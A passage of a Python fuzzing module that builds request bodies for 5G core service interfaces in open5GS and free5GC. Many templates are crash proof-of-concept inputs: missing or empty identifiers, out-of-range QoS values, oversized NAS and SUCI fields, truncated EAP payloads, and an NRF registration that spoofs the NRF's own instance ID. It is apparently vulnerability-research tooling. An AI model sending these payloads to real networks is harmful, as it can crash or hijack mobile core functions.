    }


def pcf_am_policy_create_body(supi: str = DEFAULT_SUPI,
                               mcc: str = DEFAULT_MCC,
                               mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
    """POST /npcf-am-policy-control/v1/policies body.

    suppFeat is REQUIRED by open5GS (OpenAPI_policy_association_request_parseFromJSON
    fails with [supp_feat] otherwise → 'cannot parse HTTP message' 400).
    """
    return {
        'supi':           supi,
        'notificationUri': f'http://127.0.0.5:7777/npcf-callback/v1/am-policy-notify/{supi}',
        'suppFeat':       '0',
        'servingPlmn':    _plmn(mcc, mnc),
        'accessType':     '3GPP_ACCESS',
        'ratType':        'NR',
    }


def pcf_app_session_create_body(supi: str = DEFAULT_SUPI,
                                 mcc: str = DEFAULT_MCC,
                                 mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
    """POST /npcf-policyauthorization/v1/app-sessions body."""
    return {
        'supi':           supi,
        'ipDomain':       'internet',
        'dnn':            DEFAULT_DNN,
        'ipv4Addr':       '10.45.0.1',
        'notifUri':       f'http://127.0.0.5:7777/npcf-callback/v1/app-session-notify/{supi}',
        'servInd':        'AUDIO',
        'medComponents': {
            '1': {
                'medCompN':   1,
                'medType':    'AUDIO',
                'fDescs':     ['permit out 17 from any to assigned 30000-30001'],
            },
        },
    }


def pcf_sm_policy_update_notify_body(pol_id: str = '1') -> Dict[str, Any]:
    """POST /npcf-callback/v1/sm-policy-notify/{id}/update body."""
    return {
        'resourceUri':      f'http://127.0.0.1:7777/npcf-smpolicycontrol/v1/sm-policies/{pol_id}',
        'smPolicyDecision': {},
    }


# ---------------------------------------------------------------------------
# NSSF – Network Slice Selection  (TS 29.531)
# ---------------------------------------------------------------------------

def nssf_nsselection_query(sst: int = DEFAULT_SNSSAI_SST,
                            sd: str = DEFAULT_SNSSAI_SD,
                            mcc: str = DEFAULT_MCC,
                            mnc: str = DEFAULT_MNC,
                            nf_type: str = 'AMF') -> str:
    """Build the GET query string for nnssf-nsselection/v2/network-slice-information."""
    return (f'?nf-type={nf_type}&nf-id={NF_INSTANCE_FUZZ}'
            f'&requested-nssai=%5B%7B%22sst%22%3A{sst}%7D%5D'
            f'&home-plmn-id=%7B%22mcc%22%3A%22{mcc}%22%2C%22mnc%22%3A%22{mnc}%22%7D'
            f'&tai=%7B%22plmnId%22%3A%7B%22mcc%22%3A%22{mcc}%22%2C%22mnc%22%3A%22{mnc}%22%7D%2C%22tac%22%3A%221%22%7D')


def nssf_nssai_availability_body(nf_id: str = NF_INSTANCE_FUZZ,
                                  sst: int = DEFAULT_SNSSAI_SST,
                                  sd: str = DEFAULT_SNSSAI_SD,
                                  mcc: str = DEFAULT_MCC,
                                  mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
    """PUT /nnssf-nssaiavailability/v1/nssai-availability/{nfId} body."""
    return {
        'supportedFeatures': '0',
        'amfSetId':          '0x01',
        'authorizedNssaiAvailabilityData': [
            {
                'tai': {'plmnId': _plmn(mcc, mnc), 'tac': '000001'},
                'supportedSnssaiList': [_snssai(sst, sd)],
            }
        ],
    }


# ---------------------------------------------------------------------------
# BSF – Binding Support Function  (TS 29.521)
# ---------------------------------------------------------------------------

def bsf_pcf_binding_create_body(supi: str = DEFAULT_SUPI,
                                 mcc: str = DEFAULT_MCC,
                                 mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
    """POST /nbsf-management/v1/pcfBindings body."""
    return {
        'supi':       supi,
        'ipv4Addr':   '10.45.0.1',
        'dnn':        DEFAULT_DNN,
        'pcfFqdn':    '127.0.0.1',
        'pcfIpEndPoints': [{'ipv4Address': '127.0.0.1', 'port': 7777}],
        'pcfId':      NF_INSTANCE_FUZZ,
        'servingNetwork': _plmn(mcc, mnc),
    }


def bsf_pcf_binding_no_ip(supi: str = DEFAULT_SUPI) -> Dict[str, Any]:
    """PCF binding without IP address — nil deref in BSF binding lookup."""
    return {
        'supi':   supi,
        'dnn':    DEFAULT_DNN,
        'pcfId':  NF_INSTANCE_FUZZ,
    }


# ---------------------------------------------------------------------------
# CHF – Converged Charging  (TS 29.594)
# ---------------------------------------------------------------------------

def chf_charging_create_body(supi: str = DEFAULT_SUPI,
                               pdu_sid: int = 1,
                               dnn: str = DEFAULT_DNN,
                               sst: int = DEFAULT_SNSSAI_SST,
                               sd: str = DEFAULT_SNSSAI_SD,
                               mcc: str = DEFAULT_MCC,
                               mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
    """POST /nchf-convergedcharging/v3/chargingdata body."""
    return {
        'supi':              supi,
        'pduSessionId':      pdu_sid,
        'dnn':               dnn,
        'invocationSequenceNumber': 1,
        'nfConsumerIdentification': {
            'nFName':    NF_INSTANCE_FUZZ,
            'nFIPv4Address': '127.0.0.1',
            'nFPLMNID':  _plmn(mcc, mnc),
            'nodeFunctionality': 'SMF',
        },
        'multipleUnitUsage': [
            {
                'ratingGroup': 1,
                'requestedUnit': {'time': 300, 'totalVolume': 1024},
            }
        ],
        'pduAddress':        {'pduIPv4Address': '10.45.0.1'},
        'chargingId':        1,
        'homeProvidedChargingId': 1,
        'servingNetworkFunctionID': {
            'servingNetworkFunctionInformation': {
                'nFName': NF_INSTANCE_FUZZ,
                'nFIPv4Address': '127.0.0.1',
            },
        },
        'sNssai':  _snssai(sst, sd),
        'ratType': 'NR',
    }


def chf_charging_update_body(pdu_sid: int = 1) -> Dict[str, Any]:
    """POST /nchf-convergedcharging/v3/chargingdata/{ref}/update body."""
    return {
        'invocationSequenceNumber': 2,
        'multipleUnitUsage': [
            {
                'ratingGroup':    1,
                'usedUnitContainer': [{
                    'serviceId':   1,
                    'quotaManagementIndicator': 'ONLINE_CHARGING',
                    'time':        120,
                    'totalVolume': 512,
                    'uplinkVolume': 256,
                    'downlinkVolume': 256,
                }],
            }
        ],
    }


def chf_charging_create_no_supi(pdu_sid: int = 1) -> Dict[str, Any]:
    """CHF charging create without SUPI — nil deref in CHF SUPI lookup."""
    return {
        'pduSessionId': pdu_sid,
        'dnn':          DEFAULT_DNN,
        'invocationSequenceNumber': 1,
    }


# ---------------------------------------------------------------------------
# NRF auth-bypass gap-fill  (TS 29.510 — 61 auth-bypass issues)
# ---------------------------------------------------------------------------

def nrf_profile_no_nf_type(nf_id: str) -> Dict[str, Any]:
    """PUT /nnrf-nfm/v1/nf-instances/{id} — nfType field absent.

    open5GS #4350/#4351: mandatory nfType missing — NRF dereferences
    nfType without null-check in ogs_sbi_nf_info_add().
    """
    return {
        'nfInstanceId': nf_id,
        # nfType intentionally omitted
        'nfStatus': 'REGISTERED',
        'ipv4Addresses': ['127.0.0.1'],
    }


def nrf_profile_unknown_type(nf_id: str) -> Dict[str, Any]:
    """PUT /nnrf-nfm/v1/nf-instances/{id} — unknown nfType enum value.

    open5GS / free5GC: unrecognised nfType string falls through enum switch
    without a default guard; may trigger OOB array access or nil deref.
    """
    return {
        'nfInstanceId': nf_id,
        'nfType':       'UNKNOWN_NF_TYPE_XYZZY',
        'nfStatus':     'REGISTERED',
        'ipv4Addresses': ['127.0.0.1'],
    }


def nrf_profile_self_as_nrf(nf_id: str, mcc: str = DEFAULT_MCC,
                              mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
    """PUT registering as nfType=NRF — NRF self-registration confusion.

    open5GS #4467 family: NRF treats its own NF type registration differently;
    registering as NRF exercises the nfType=NRF code path that lacks guards.
    """
    return {
        'nfInstanceId': nf_id,
        'nfType':       'NRF',
        'nfStatus':     'REGISTERED',
        'plmnList':     [_plmn(mcc, mnc)],
        'ipv4Addresses': ['127.0.0.1'],
    }


def nrf_profile_conflicting_id(nf_id: str = '00000000-0000-0000-0000-000000000001',
                                mcc: str = DEFAULT_MCC,
                                mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
    """PUT with a well-known NRF internal instance ID to spoof an existing NF.

    Attempts to overwrite NRF's own internal record — auth-bypass spoofing.
    """
    return {
        'nfInstanceId': nf_id,   # NRF bootstrap ID in open5GS
        'nfType':       'NRF',
        'nfStatus':     'REGISTERED',
        'plmnList':     [_plmn(mcc, mnc)],
    }


# ---------------------------------------------------------------------------
# SMF gap-fill  (TS 29.502 nsmf-pdusession — missing-field / bad-value attacks)
# ---------------------------------------------------------------------------

def sm_context_no_supi(pdu_sid: int = 1, dnn: str = DEFAULT_DNN,
                        sst: int = DEFAULT_SNSSAI_SST,
                        sd: str = DEFAULT_SNSSAI_SD,
                        mcc: str = DEFAULT_MCC,
                        mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
    """POST /nsmf-pdusession/v1/sm-contexts — supi field absent.

    open5GS #4453 family: SMF ogs_sbi_server_handler() dereferences supi
    before checking if it was present; absent supi → NULL string deref.
    """
    return {
        # supi intentionally omitted
        'pduSessionId':   pdu_sid,
        'dnn':            dnn,
        'sNssai':         _snssai(sst, sd),
        'servingNetwork': _plmn(mcc, mnc),
        'requestType':    'INITIAL_REQUEST',
        'anType':         '3GPP_ACCESS',
    }


def sm_context_empty_supi(pdu_sid: int = 1, dnn: str = DEFAULT_DNN,
                           mcc: str = DEFAULT_MCC, mnc: str = DEFAULT_MNC,
                           sst: int = DEFAULT_SNSSAI_SST,
                           sd: str = DEFAULT_SNSSAI_SD) -> Dict[str, Any]:
    """POST /nsmf-pdusession/v1/sm-contexts — supi="" (empty string).

    Empty SUPI bypasses some format checks but still reaches ogs_id_get_type()
    which returns NULL on empty string → assertion failure.
    """
    return {
        'supi':           '',    # empty — ogs_id_get_type returns NULL
        'pduSessionId':   pdu_sid,
        'dnn':            dnn,
        'sNssai':         _snssai(sst, sd),
        'servingNetwork': _plmn(mcc, mnc),
        'requestType':    'INITIAL_REQUEST',
        'anType':         '3GPP_ACCESS',
    }


def sm_context_bad_qos(supi: str = DEFAULT_SUPI, pdu_sid: int = 1,
                        dnn: str = DEFAULT_DNN,
                        mcc: str = DEFAULT_MCC, mnc: str = DEFAULT_MNC,
                        sst: int = DEFAULT_SNSSAI_SST,
                        sd: str = DEFAULT_SNSSAI_SD) -> Dict[str, Any]:
    """POST /nsmf-pdusession/v1/sm-contexts — QFI=256 (valid range 1-63).

    out-of-range QFI exercises array index checks in SMF QoS flow allocation;
    open5GS uses qos_flow[qfi] array indexing — QFI>63 → OOB write.
    """
    return {
        'supi':             supi,
        'pduSessionId':     pdu_sid,
        'dnn':              dnn,
        'sNssai':           _snssai(sst, sd),
        'servingNetwork':   _plmn(mcc, mnc),
        'requestType':      'INITIAL_REQUEST',
        'anType':           '3GPP_ACCESS',
        'qosFlows': [
            {'qfi': 256, 'qosRules': b''.hex()},   # QFI=256 exceeds 6-bit max
            {'qfi': 0,   'qosRules': b''.hex()},   # QFI=0 also invalid
        ],
    }


def sm_context_no_dnn(supi: str = DEFAULT_SUPI, pdu_sid: int = 1,
                       mcc: str = DEFAULT_MCC, mnc: str = DEFAULT_MNC,
                       sst: int = DEFAULT_SNSSAI_SST,
                       sd: str = DEFAULT_SNSSAI_SD) -> Dict[str, Any]:
    """POST /nsmf-pdusession/v1/sm-contexts — dnn field absent.

    SMF looks up DNN configuration before creating the PDU session;
    missing dnn triggers a NULL deref in dnn lookup table traversal.
    """
    return {
        'supi':           supi,
        'pduSessionId':   pdu_sid,
        # dnn intentionally omitted
        'sNssai':         _snssai(sst, sd),
        'servingNetwork': _plmn(mcc, mnc),
        'requestType':    'INITIAL_REQUEST',
        'anType':         '3GPP_ACCESS',
    }


def sm_context_invalid_pdu_type(supi: str = DEFAULT_SUPI, pdu_sid: int = 1,
                                  dnn: str = DEFAULT_DNN,
                                  mcc: str = DEFAULT_MCC, mnc: str = DEFAULT_MNC,
                                  sst: int = DEFAULT_SNSSAI_SST,
                                  sd: str = DEFAULT_SNSSAI_SD) -> Dict[str, Any]:
    """POST /nsmf-pdusession/v1/sm-contexts — pduSessionType="IPV99".

    Unknown pduSessionType enum value exercises the switch default path in
    SMF session type allocation; open5GS may assert on unknown values.
    """
    return {
        'supi':             supi,
        'pduSessionId':     pdu_sid,
        'dnn':              dnn,
        'pduSessionType':   'IPV99',    # not in enum: IPV4, IPV6, IPV4V6, UNSTRUCTURED
        'sNssai':           _snssai(sst, sd),
        'servingNetwork':   _plmn(mcc, mnc),
        'requestType':      'INITIAL_REQUEST',
        'anType':           '3GPP_ACCESS',
    }


# ---------------------------------------------------------------------------
# AUSF gap-fill  (TS 29.509 nausf-auth — 45 issues, 14+ severe)
# ---------------------------------------------------------------------------

def ausf_auth_bad_suci(mcc: str = DEFAULT_MCC,
                        mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
    """POST /nausf-auth/v1/ue-authentications — malformed SUCI format.

    open5GS #4472/#4523: suci decoder ogs_nas_5gs_mobile_identity_suci_get_type()
    accesses sub-fields without validating the SUCI routing indicator length.
    'suci-0-' prefix without required fields triggers the underread.
    """
    return {
        'supiOrSuci':         'suci-0-',    # truncated — missing MNC/MCC/routing fields
        'servingNetworkName': f'5G:mnc{mnc}.mcc{mcc}.3gppnetwork.org',
        'resynchronizationInfo': None,
    }


def ausf_auth_empty_suci(mcc: str = DEFAULT_MCC,
                          mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
    """POST /nausf-auth/v1/ue-authentications — empty supiOrSuci string.

    Empty string bypasses suci/supi detection; ogs_id_get_type('') → NULL
    deref on the type switch in ogs_sbi_self()->ausf_suci_authenticate_list.
    """
    return {
        'supiOrSuci':         '',
        'servingNetworkName': f'5G:mnc{mnc}.mcc{mcc}.3gppnetwork.org',
        'resynchronizationInfo': None,
    }


def ausf_auth_long_suci(mcc: str = DEFAULT_MCC,
                         mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
    """POST /nausf-auth/v1/ue-authentications — 1024-char SUCI (overflow probe).

    Stack or heap buffer allocated for SUCI parsing may be fixed-size;
    very long input exercises the length check (or lack thereof).
    """
    return {
        'supiOrSuci':         'suci-0-' + 'A' * 1017,
        'servingNetworkName': f'5G:mnc{mnc}.mcc{mcc}.3gppnetwork.org',
        'resynchronizationInfo': None,
    }


def ausf_auth_resynch(supi: str = DEFAULT_SUPI,
                       mcc: str = DEFAULT_MCC,
                       mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
    """POST /nausf-auth/v1/ue-authentications — with resynchronizationInfo (AUTS).

    Triggers the re-synchronization code path in AUSF which decodes AUTS;
    malformed AUTS (wrong length / format) exercises the decoder boundary.
    auts is 14 bytes base64-encoded; we provide 10 bytes to trigger short-read.
    """
    return {
        'supiOrSuci':         supi,
        'servingNetworkName': f'5G:mnc{mnc}.mcc{mcc}.3gppnetwork.org',
        'resynchronizationInfo': {
            'rand': 'AAAAAAAAAAAAAAAAAAAAAA==',    # 16 bytes (valid length)
            'auts': 'AQIDBAUG',                   # 6 bytes (should be 14 → short read)
        },
    }


def ausf_auth_wrong_network(supi: str = DEFAULT_SUPI) -> Dict[str, Any]:
    """POST /nausf-auth/v1/ue-authentications — mismatched serving network.

    Serving network name doesn't match configured PLMN; exercises the
    network-name validation path which may NULL-deref on lookup failure.
    """
    return {
        'supiOrSuci':         supi,
        'servingNetworkName': '5G:mnc999.mcc999.3gppnetwork.org',
        'resynchronizationInfo': None,
    }


# ---------------------------------------------------------------------------
# AMF SBI gap-fill  (TS 29.518 namf-comm — garbage NAS, transfer crashes)
# ---------------------------------------------------------------------------

def amf_n1n2_garbage_nas(supi: str = DEFAULT_SUPI,
                          pdu_sid: int = 1,
                          mcc: str = DEFAULT_MCC,
                          mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
    """POST /namf-comm/v1/ue-contexts/{ueId}/n1-n2-messages — garbage NAS PDU.

    open5GS #4403: NAS PDU is base64-decoded then fed to ogs_nas_5gs_decode();
    random bytes cause OOB read in the NAS message type dispatch table.
    """
    import base64
    garbage = bytes([0xFF, 0x7E, 0x00, 0xAB, 0xCD, 0x01, 0xFF, 0x00] * 8)
    return {
        'n1MessageContainer': {
            'n1MessageClass':   'SM',
            'n1MessageContent': {'contentId': 'n1SmMsg'},
        },
        'n1SmMsg': {
            'contentId': 'n1SmMsg',
            'content':   base64.b64encode(garbage).decode(),
        },
        'pduSessionId': pdu_sid,
        'ueContextId':  supi,
    }


def amf_n1n2_oversized_nas(supi: str = DEFAULT_SUPI,
                             pdu_sid: int = 1) -> Dict[str, Any]:
    """POST /namf-comm/v1/ue-contexts/{ueId}/n1-n2-messages — 64 KB NAS PDU.

    Exercises NAS decode buffer allocation limits; heap exhaustion or
    size-check bypass depending on implementation.
    """
    import base64
    big_nas = b'\x7e\x00' + b'\x00' * 65530   # NAS header + 65530 zero bytes
    return {
        'n1MessageContainer': {
            'n1MessageClass':   'SM',
            'n1MessageContent': {'contentId': 'n1SmMsg'},
        },
        'n1SmMsg': {
            'contentId': 'n1SmMsg',
            'content':   base64.b64encode(big_nas).decode(),
        },
        'pduSessionId': pdu_sid,
        'ueContextId':  supi,
    }


def amf_n1n2_empty_nas(supi: str = DEFAULT_SUPI,
                        pdu_sid: int = 1) -> Dict[str, Any]:
    """POST /namf-comm/v1/ue-contexts/{ueId}/n1-n2-messages — empty NAS PDU.

    Empty base64 content; ogs_nas_5gs_decode() called with length=0 →
    immediate NULL deref on first byte access of NAS message type.
    """
    return {
        'n1MessageContainer': {
            'n1MessageClass':   'SM',
            'n1MessageContent': {'contentId': 'n1SmMsg'},
        },
        'n1SmMsg': {
            'contentId': 'n1SmMsg',
            'content':   '',    # empty — zero-length NAS
        },
        'pduSessionId': pdu_sid,
        'ueContextId':  supi,
    }


def amf_ue_ctx_no_supi(mcc: str = DEFAULT_MCC,
                        mnc: str = DEFAULT_MNC,
                        sst: int = DEFAULT_SNSSAI_SST) -> Dict[str, Any]:
    """PUT /namf-comm/v1/ue-contexts/{ueId} — supi field absent from body.

    AMF stores the supi from the body, not just the URL path param;
    absent body supi may diverge from path supi causing a null deref
    in the supi comparison at context lookup.
    """
    return {
        # supi intentionally omitted
        'supiUnauthInd':      False,
        'mmContextList':      [{'accessType': '3GPP_ACCESS', 'nasSecurityMode': {}}],
        'sessionContextList': [],
        'allowedNssai':       [{'allowedSnssaiList': [_snssai(sst)], 'accessType': '3GPP_ACCESS'}],
        'traceData':          None,
    }


def amf_ue_ctx_bad_plmn(supi: str = DEFAULT_SUPI,
                          sst: int = DEFAULT_SNSSAI_SST) -> Dict[str, Any]:
    """PUT /namf-comm/v1/ue-contexts/{ueId} — PLMN mismatch between SUPI and body.

    SUPI prefix (001/01) doesn't match guami plmnId (999/99);
    AMF PLMN validation may crash when comparing mismatched network ids.
    """
    return {
        'supi':               supi,
        'supiUnauthInd':      False,
        'mmContextList':      [{
            'accessType': '3GPP_ACCESS',
            'nasSecurityMode': {},
            'ueSecurityCapability': {},
            'allowedNssai': [_snssai(sst)],
        }],
        'sessionContextList': [],
        'traceData':          None,
    }


# ---------------------------------------------------------------------------
# Convenience builder: body bytes from template name + fields
# ---------------------------------------------------------------------------

def build_body(template_name: str, fields: Dict[str, Any]) -> bytes:
    """Return JSON body bytes for a given template name + field overrides.

    Used by SbiAdapter.build_message() to assemble the request body.
    Returns b'' for GET / DELETE requests (no body needed).
    """
    mcc = str(fields.get('plmn_mcc', DEFAULT_MCC))
    mnc = str(fields.get('plmn_mnc', DEFAULT_MNC))
    sst = int(fields.get('snssai_sst', DEFAULT_SNSSAI_SST))
    sd  = str(fields.get('snssai_sd', DEFAULT_SNSSAI_SD))
    supi     = str(fields.get('supi', DEFAULT_SUPI))
    nf_id    = str(fields.get('nf_instance_id', NF_INSTANCE_FUZZ))
    pdu_sid  = int(fields.get('pdu_session_id', 1))
    acc_type = str(fields.get('access_type', '3GPP_ACCESS'))
    rat_type = str(fields.get('rat_type', 'NR'))
    nf_type  = str(fields.get('nf_type', 'AMF'))

    body_dict: Optional[Dict[str, Any]] = None

    if template_name == 'nrf_nf_register':
        if nf_type == 'SMF':
            body_dict = nf_profile_smf(nf_id, mcc, mnc)
        else:
            body_dict = nf_profile_amf(nf_id, mcc, mnc, sst, sd)

    elif template_name == 'nrf_nf_register_malformed':
        body_dict = nf_profile_malformed(nf_id)

    elif template_name == 'nrf_nf_register_type_mismatch':
        body_dict = nf_profile_type_mismatch(nf_id, mcc, mnc)

    elif template_name == 'nrf_nf_subscribe':
        body_dict = nf_subscription(nf_id, mcc, mnc)

    elif template_name == 'amf_ue_ctx_create':
        body_dict = ue_context_create(supi, mcc, mnc, sst)

    elif template_name == 'amf_ue_ctx_bad_supi':
        body_dict = ue_context_create_bad_supi(supi)

    elif template_name == 'amf_n1n2_msg':
        body_dict = n1n2_message_transfer(supi, pdu_sid, mcc, mnc)

    elif template_name == 'amf_evts_subscribe':
        body_dict = amf_event_subscription(nf_id)

    elif template_name == 'smf_ctx_create':
        body_dict = sm_context_create(supi, pdu_sid, DEFAULT_DNN,
                                      sst, sd, mcc, mnc, acc_type, rat_type, nf_id)

    elif template_name == 'smf_ctx_create_wrong_plmn':
        body_dict = sm_context_create_wrong_plmn(supi, pdu_sid)

    elif template_name == 'smf_ctx_modify':
        body_dict = sm_context_modify(pdu_sid, supi)

    elif template_name == 'smf_ctx_modify_wrong_state':
        body_dict = sm_context_modify_wrong_state(pdu_sid, supi)

    elif template_name == 'smf_ctx_release':
        body_dict = sm_context_release()

    # ── v2.7.7 exact-PoC templates ─────────────────────────────────────────
    elif template_name == 'nrf_scp_overflow':
        body_dict = nf_profile_scp_overflow(nf_id)

    elif template_name == 'udm_purgeflag':
        body_dict = udm_purgeflag_body(mcc, mnc)

    elif template_name == 'amf_oversized_nssais':
        body_dict = ue_context_oversized_nssais(supi, num_nssais=9)

    elif template_name == 'amf_malformed_gpsi':
        body_dict = ue_context_malformed_gpsi(supi)

    elif template_name == 'udr_malformed_pei':
        # #4411: pei="foo" — no type separator → ogs_id_get_value() returns NULL
        # Path must be .../context-data/amf-3gpp-access so component[3] matches
        # the PUT branch. amfInstanceId + guami are required for parse to succeed.
        mcc = fields.get('plmn_mcc', '999')
        mnc = fields.get('plmn_mnc', '70')
        body_dict = {
            'amfInstanceId': '00000000-0000-0000-0000-000000000001',
            'deregCallbackUri': 'http://127.0.0.5:7777/namf-comm/v1/ue-contexts/imsi-001010000000001/deregistration-data',
            'guami': {'plmnId': {'mcc': str(mcc), 'mnc': str(mnc)},
                      'amfId': '000001'},
            'ratType': 'NR',
            'imsVoPs': 'HOMOGENEOUS_SUPPORTING',
            'pei': 'foo',
        }

    elif template_name == 'udr_malformed_pei_bad_type':
        # #4411 variant: pei="unknown-value" — valid format but unknown type.
        # ogs_id_get_type("unknown-value") = "unknown", ogs_id_get_value = "value".
        # strcmp("unknown", "imeisv") fails → ogs_fatal + ogs_assert_if_reached().
        # Different crash vector from pei="foo" (which crashes on NULL value).
        mcc = fields.get('plmn_mcc', '999')
        mnc = fields.get('plmn_mnc', '70')
        body_dict = {
            'amfInstanceId': '00000000-0000-0000-0000-000000000001',
            'deregCallbackUri': 'http://127.0.0.5:7777/namf-comm/v1/ue-contexts/imsi-001010000000001/deregistration-data',
            'guami': {'plmnId': {'mcc': str(mcc), 'mnc': str(mnc)},
                      'amfId': '000001'},
            'ratType': 'NR',
            'imsVoPs': 'HOMOGENEOUS_SUPPORTING',
            'pei': 'unknown-1234567890123456',
        }

    # ── Generic array-count fuzzing (driven by array_count field) ─────────
    # These use the same shapes as the PoC templates above but read n from
    # the semantic mutation field so the RL agent can sweep [1..32] and learn
    # where the crash boundary is without a hardcoded payload.
    elif template_name == 'nrf_scp_array_fuzz':
        n = max(0, int(fields.get('array_count', 9)))
        body_dict = nf_profile_scp_overflow(nf_id, n=n)

    elif template_name == 'amf_nssai_array_fuzz':
        n = max(0, int(fields.get('array_count', 9)))
        body_dict = ue_context_oversized_nssais(supi, num_nssais=n)

    # ── New crash-confirmed templates (from issue analysis) ───────────────
    elif template_name == 'amf_ue_ctx_transfer':
        body_dict = ue_context_transfer_body(supi)

    elif template_name == 'amf_ue_ctx_transfer_update':
        body_dict = ue_context_transfer_body(supi)   # same minimal shape

    elif template_name == 'amf_comm_sub_create':
        body_dict = amf_comm_sub_create_body(nf_id)

    elif template_name == 'amf_comm_sub_delete':
        return b''   # DELETE has no body

    elif template_name == 'amf_callback_sdm_notify':
        body_dict = amf_callback_sdm_notify_body()

    elif template_name == 'amf_callback_n1_notify':
        body_dict = amf_callback_n1_notify_body()

    elif template_name == 'ausf_auth_create':
        body_dict = ausf_auth_create_body(supi, mcc, mnc)

    elif template_name == 'ausf_eap_session':
        # Cycle through short eap payloads by pdu_session_id to sweep lengths
        _eap_variants = [
            '',            # empty — immediate OOB read
            'Ag==',        # 2 bytes — type+id only, len field missing
            'AgAA',        # 3 bytes — truncated length
            'AgAABQ==',    # 5 bytes — length says 5, no data bytes
            'AgAABBMA',    # 6 bytes — AT_PERMANENT_ID_REQ attr, too short for loop
            'AgAADQ==',    # 4 bytes — length=0 (null deref on attribute loop)
        ]
        payload = _eap_variants[pdu_sid % len(_eap_variants)]
        body_dict = ausf_eap_session_body(payload)

    elif template_name == 'udm_auth_data':
        body_dict = udm_auth_data_body(supi, mcc, mnc)

    elif template_name == 'udm_uecm_amf_reg':
        body_dict = udm_uecm_amf_reg_body(mcc, mnc)

    elif template_name == 'udm_sdm_sub_create':
        body_dict = udm_sdm_sub_create_body(supi, mcc, mnc)

    elif template_name == 'udm_sdm_sub_modify':
        body_dict = udm_sdm_sub_modify_body()

    elif template_name == 'smf_policy_notify':
        body_dict = smf_policy_notify_body(f'ctx-{pdu_sid}')

    elif template_name == 'nrf_status_notify':
        n = max(1, int(fields.get('array_count', 2)))
        body_dict = nrf_status_notify_body(nf_id, dnn_count=n)

    # ── Cross-platform templates (free5GC + open5GS) ──────────────────────
    elif template_name == 'nrf_oauth2_token':
        # free5GC #434: cycle through unknown targetNfType strings
        _unknown_types = ['NOPE', 'UNKNOWN', 'INVALID', '', 'A' * 64, 'null', '0']
        target_type = _unknown_types[pdu_sid % len(_unknown_types)]
        body_dict = nrf_oauth2_token_body(target_nf_type=target_type,
                                          nf_type=nf_type, nf_instance_id=nf_id)

    elif template_name == 'udm_uecm_amf_reg_incomplete':
        body_dict = udm_uecm_amf_reg_incomplete(mcc, mnc)

    elif template_name == 'amf_evts_sub_modify':
        body_dict = amf_evts_sub_modify_body(f'{pdu_sid}')

    elif template_name == 'amf_ue_ctx_restricted_rat':
        body_dict = ue_context_restricted_rat(supi, mcc, mnc, sst)

    # ── PCF templates ─────────────────────────────────────────────────────────
    elif template_name == 'pcf_sm_policy_create':
        body_dict = pcf_sm_policy_create_body(supi, pdu_sid, DEFAULT_DNN, sst, sd, mcc, mnc)

    elif template_name == 'pcf_sm_policy_create_no_supi':
        body_dict = pcf_sm_policy_create_no_supi(pdu_sid)

    elif template_name == 'pcf_am_policy_create':
        body_dict = pcf_am_policy_create_body(supi, mcc, mnc)

    elif template_name == 'pcf_app_session_create':
        body_dict = pcf_app_session_create_body(supi, mcc, mnc)

    elif template_name == 'pcf_sm_policy_update_notify':
        body_dict = pcf_sm_policy_update_notify_body(f'pol-{pdu_sid}')

    # ── NSSF templates ────────────────────────────────────────────────────────
    elif template_name == 'nssf_nssai_availability':
        body_dict = nssf_nssai_availability_body(nf_id, sst, sd, mcc, mnc)

    # ── BSF templates ─────────────────────────────────────────────────────────
    elif template_name == 'bsf_pcf_binding_create':
        body_dict = bsf_pcf_binding_create_body(supi, mcc, mnc)

    elif template_name == 'bsf_pcf_binding_no_ip':
        body_dict = bsf_pcf_binding_no_ip(supi)

    # ── CHF templates ─────────────────────────────────────────────────────────
    elif template_name == 'chf_charging_create':
        body_dict = chf_charging_create_body(supi, pdu_sid, DEFAULT_DNN, sst, sd, mcc, mnc)

    elif template_name == 'chf_charging_update':
        body_dict = chf_charging_update_body(pdu_sid)

    elif template_name == 'chf_charging_create_no_supi':
        body_dict = chf_charging_create_no_supi(pdu_sid)

    # ── NRF auth-bypass gap-fill ──────────────────────────────────────────────
    elif template_name == 'nrf_register_no_nf_type':
        body_dict = nrf_profile_no_nf_type(nf_id)

    elif template_name == 'nrf_register_unknown_type':
        body_dict = nrf_profile_unknown_type(nf_id)

    elif template_name == 'nrf_register_self_as_nrf':
        body_dict = nrf_profile_self_as_nrf(nf_id, mcc, mnc)

    elif template_name == 'nrf_register_conflicting_id':
        body_dict = nrf_profile_conflicting_id(mcc=mcc, mnc=mnc)

    # ── SMF gap-fill ──────────────────────────────────────────────────────────
    elif template_name == 'smf_ctx_create_no_supi':
        body_dict = sm_context_no_supi(pdu_sid, DEFAULT_DNN, sst, sd, mcc, mnc)

    elif template_name == 'smf_ctx_create_empty_supi':
        body_dict = sm_context_empty_supi(pdu_sid, DEFAULT_DNN, mcc, mnc, sst, sd)

    elif template_name == 'smf_ctx_create_bad_qos':
        body_dict = sm_context_bad_qos(supi, pdu_sid, DEFAULT_DNN, mcc, mnc, sst, sd)

    elif template_name == 'smf_ctx_create_no_dnn':
        body_dict = sm_context_no_dnn(supi, pdu_sid, mcc, mnc, sst, sd)

    elif template_name == 'smf_ctx_create_invalid_pdu_type':
        body_dict = sm_context_invalid_pdu_type(supi, pdu_sid, DEFAULT_DNN, mcc, mnc, sst, sd)

    # ── AUSF gap-fill ─────────────────────────────────────────────────────────
    elif template_name == 'ausf_auth_bad_suci':
        body_dict = ausf_auth_bad_suci(mcc, mnc)

    elif template_name == 'ausf_auth_empty_suci':
        body_dict = ausf_auth_empty_suci(mcc, mnc)

    elif template_name == 'ausf_auth_long_suci':
        body_dict = ausf_auth_long_suci(mcc, mnc)

    elif template_name == 'ausf_auth_resynch':
        body_dict = ausf_auth_resynch(supi, mcc, mnc)

    elif template_name == 'ausf_auth_wrong_network':
        body_dict = ausf_auth_wrong_network(supi)

    # ── AMF SBI gap-fill ──────────────────────────────────────────────────────
    elif template_name == 'amf_n1n2_garbage_nas':
